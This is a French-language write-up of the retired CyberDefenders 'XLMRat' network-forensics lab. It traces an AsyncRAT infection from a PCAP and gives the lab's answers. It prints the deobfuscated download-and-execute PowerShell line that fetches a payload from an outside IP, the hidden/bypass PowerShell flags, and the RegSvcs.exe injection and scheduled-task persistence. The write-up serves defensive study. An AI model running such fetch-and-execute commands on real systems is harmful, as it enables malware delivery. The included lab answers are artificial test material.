# Day-002 — XLMRat Lab

| | |
|---|---|
| **Plateforme** | [CyberDefenders](https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/) |
| **Catégorie** | Network Forensics |
| **Difficulté** | Easy · **Retired** |
| **Durée estimée** | ~30 min |
| **Date** | 2026-08-13 |
| **Outils** | Wireshark / tshark · CyberChef · VirusTotal · PowerShell |

> ✅ Lab **retired** — les réponses/flags sont inclus (writeups autorisés par CyberDefenders une fois le lab retiré).

---

## 🎯 Scénario

Une machine compromise (`10.1.9.101`) a généré du trafic réseau suspect. À partir d'un **seul artefact** — un PCAP (`236-XLMRat.pcap`) — il faut déterminer la méthode d'attaque, identifier les payloads, et retracer la timeline : comment l'attaquant a obtenu l'accès, quels outils/techniques ont été utilisés, et comment le malware opère après compromission.

---

## 🧭 Kill Chain reconstruite

```
Script VBS (xlm.txt)  →  télécharge & exécute  →  mdm.jpg (PowerShell déguisé)
        →  déobfuscation : 2 payloads (loader NewPE2 + RAT AsyncRat)
        →  injection du RAT dans RegSvcs.exe (LOLBin, fileless)
        →  persistance : dépôt de Conted.{ps1,bat,vbs} + tâche planifiée "Update Edge" (toutes les 2 min)
```

---

# 🌐 Bloc 1 — PCAP Analysis

### Survol & livraison (Q1-Q2)

Filtre Wireshark `http.request` : la victime `10.1.9.101` télécharge **2 fichiers** depuis `45.126.209.4:222` :

| Ordre | Temps | Requête |
|---|---|---|
| 1 | 0.295 s | `GET /xlm.txt` (le script déclencheur) |
| 2 | 1.585 s | `GET /mdm.jpg` (le 1er stage du malware) |

---

### Q1 — URL du 1er stage du malware

Le script `xlm.txt` **exécute une commande** (`IEX (New-Object Net.WebClient).DownloadString(...)`) qui télécharge le **stage du malware**. Ce n'est donc pas `xlm.txt` (le vecteur) mais le fichier qu'il récupère.

![Full request URI mdm.jpg](screenshots/01-http-request-mdm-url.png)

> ✅ **Réponse Q1 : `http://45.126.209.4:222/mdm.jpg`**
> 🎯 ATT&CK : **T1105 – Ingress Tool Transfer**

---

### Q2 — Hébergeur de l'IP

Recherche threat-intel sur `45.126.209.4` (VirusTotal → Details → *AS Owner*, ou ipinfo.io) : AS 23470.

![VirusTotal IP - ReliableSite.Net](screenshots/02-virustotal-ip-reliablesite.png)

> ✅ **Réponse Q2 : `ReliableSite.Net`**

---

# 🧬 Bloc 2 — Analyse des scripts (déobfuscation)

### `xlm.txt` — VBScript obfusqué

Le contenu est un VBScript qui **reconstitue une commande PowerShell** à partir d'un tableau de 88 fragments de 2 caractères, puis l'exécute en mode caché :

```
Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDEN -eXeC BYPASS -NONI <commande reconstituée>
```

Une fois recollée, la commande est :

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://45.126.209.4:222/mdm.jpg')
```

→ `mdm.jpg` n'est **pas une image** : c'est un **script PowerShell** téléchargé puis exécuté en mémoire.
🎯 ATT&CK : **T1059.001 (PowerShell)**, **T1027 (Obfuscated Files or Information)**

On récupère le contenu via **clic droit sur `GET /mdm.jpg` → Follow → HTTP Stream** :

![Follow HTTP Stream](screenshots/03-follow-http-stream-menu.png)

Le flux révèle le `Content-Type: image/jpeg` (leurre) suivi du script PowerShell et de la chaîne `$hexString_bbb = "4D_5A_90_00…"` (`MZ` = exécutable) :

![Contenu mdm.jpg - payload hex](screenshots/04-mdm-hexstring-payload.png)

### `mdm.jpg` — loader PowerShell (RunPE)

Il contient **2 payloads** encodés en hexadécimal (chaînes `4D_5A_90_00…`, signature `MZ` = exécutable) :

| Variable | Rôle | Taille |
|---|---|---|
| `$hexString_pe` | Loader / injecteur **NewPE2** (.NET) | 76 288 o |
| `$hexString_bbb` | Exécutable secondaire = le **RAT** | 66 560 o |

Le loader charge NewPE2 (`Assembly.Load`) puis appelle `NewPE2.PE.Execute(<RegSvcs.exe>, <RAT>)` → **injection de processus** du RAT dans un binaire Windows légitime.

---

### Q3 — SHA256 de l'exécutable secondaire (le RAT)

On reconstruit les octets de `$hexString_bbb` et on calcule leur SHA256 (analyse statique, sans exécution).

**Méthode CyberChef :** `Find/Replace (_→espace)` → `From Hex (Space)` → `SHA2 (256)`

**Méthode reproductible (extraction depuis le PCAP) :**
```powershell
# 1) Extraire mdm.jpg du PCAP
& "C:\Program Files\Wireshark\tshark.exe" -r 236-XLMRat.pcap --export-objects "http,.\obj" -q
# 2) Reconstruire le payload bbb et hasher (aucune exécution du malware)
$txt = Get-Content .\obj\mdm.jpg -Raw
$hex = [regex]::Match($txt,'\$hexString_bbb\s*=\s*"([0-9A-Fa-f_]+)"').Groups[1].Value
$bytes = $hex -split '_' | % { [byte][convert]::ToInt32($_,16) }
[IO.File]::WriteAllBytes(".\payload_bbb.bin",$bytes)
Get-FileHash .\payload_bbb.bin -Algorithm SHA256
```

![CyberChef - SHA256 du payload](screenshots/05-cyberchef-sha256.png)

> ✅ **Réponse Q3 : `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798`**

---

# 🦠 Bloc 3 — Threat Intelligence (VirusTotal)

### Q4 — Famille de malware (label Alibaba)

Sur VirusTotal (hash Q3) → onglet **Detection** → ligne **Alibaba** : `Backdoor:MSIL/AsyncRat.2786761`. Les *Family labels* (`asyncrat`, `msil`, `marte`) et le *Popular threat label* `trojan.asyncrat/msil` confirment.

![VirusTotal Detection - Alibaba AsyncRat](screenshots/06-virustotal-alibaba-asyncrat.png)

> ✅ **Réponse Q4 : `AsyncRat`**

---

### Q5 — Timestamp de compilation (PE header)

VirusTotal → onglet **Details** → section **History** → *Creation Time*.
(À noter : compilé le 30/10/2023, "First seen in the wild" le 11/01/2024.)

![VirusTotal Details - Creation Time](screenshots/07-virustotal-compile-timestamp.png)

> ✅ **Réponse Q5 : `2023-10-30 15:08`**

---

# 🛡️ Bloc 4 — Exécution & Persistance

### Q6 — LOLBin utilisé pour l'exécution furtive

Le loader injecte le RAT dans un binaire .NET légitime de Windows (`RegSvcs.exe`), dont le chemin est reconstitué par concaténation (`'Mi'+'cr'+'osoft.NET\...'`) pour éviter la détection. Exécution **fileless** dans un processus signé Microsoft. On le voit dans le script (variable `$AC` → `RegSvcs.exe`, puis `Execute($AC, $NKbb)`) :

![Script - RegSvcs.exe + tâche planifiée](screenshots/08-script-regsvcs-scheduledtask.png)

> ✅ **Réponse Q6 : `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`**
> 🎯 ATT&CK : **T1218 (System Binary Proxy Execution)** + **T1055 (Process Injection)**

---

### Q7 — Fichiers déposés par le script

Le script écrit 3 fichiers dans `C:\Users\Public\` via `[IO.File]::WriteAllText(...)`, puis crée une tâche planifiée **"Update Edge"** qui exécute `Conted.vbs` **toutes les 2 minutes** (`PT2M`). Chaîne de relance : `Conted.vbs → Conted.bat → Conted.ps1 → ré-injection d'AsyncRat`.

![Script - fichiers Conted déposés](screenshots/09-script-dropped-files.png)

> ✅ **Réponse Q7 : `Conted.ps1, Conted.bat, Conted.vbs`**
> 🎯 ATT&CK : **T1053.005 (Scheduled Task)**

---

## 📊 Récapitulatif des réponses

| Q | Découverte | Réponse |
|---|---|---|
| Q1 | URL du 1er stage | `http://45.126.209.4:222/mdm.jpg` |
| Q2 | Hébergeur | `ReliableSite.Net` |
| Q3 | SHA256 du RAT | `1eb7b02e18f67420f42b1d94e74f3b6289d92672a0fb1786c30c03d68e81d798` |
| Q4 | Famille (Alibaba) | `AsyncRat` |
| Q5 | Compile timestamp | `2023-10-30 15:08` |
| Q6 | LOLBin | `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` |
| Q7 | Fichiers déposés | `Conted.ps1, Conted.bat, Conted.vbs` |

## 🗺️ Mapping MITRE ATT&CK

| Tactique | Technique |
|---|---|
| Execution | T1059.001 (PowerShell) |
| Defense Evasion | T1027 (Obfuscation), T1218 (RegSvcs LOLBin), T1055 (Process Injection) |
| Persistence | T1053.005 (Scheduled Task) |
| Command & Control | T1105 (Ingress Tool Transfer) |

## 🧠 Ce que j'ai appris

- Déobfusquer un **loader multi-étages** VBS → PowerShell → payloads hex.
- Reconstruire un exécutable à partir d'octets hex et le hasher **sans l'exécuter** (analyse statique via CyberChef).
- Comprendre l'**injection de processus fileless** dans un **LOLBin** (`RegSvcs.exe`).
- Identifier une famille (**AsyncRAT**) et sa persistance via **tâche planifiée**.

## 🛡️ Recommandations (Blue Team)

- Bloquer/surveiller les **PowerShell** avec `-WindowStyle Hidden -ExecutionPolicy Bypass` (journalisation Script Block Logging).
- Alerter sur `RegSvcs.exe` établissant des **connexions réseau** ou lancé sans contexte légitime.
- Surveiller la création de **tâches planifiées** suspectes (ex. "Update Edge") et les écritures dans `C:\Users\Public\`.
- Bloquer l'IP/domaine C2 `45.126.209.4` au niveau du pare-feu/proxy.
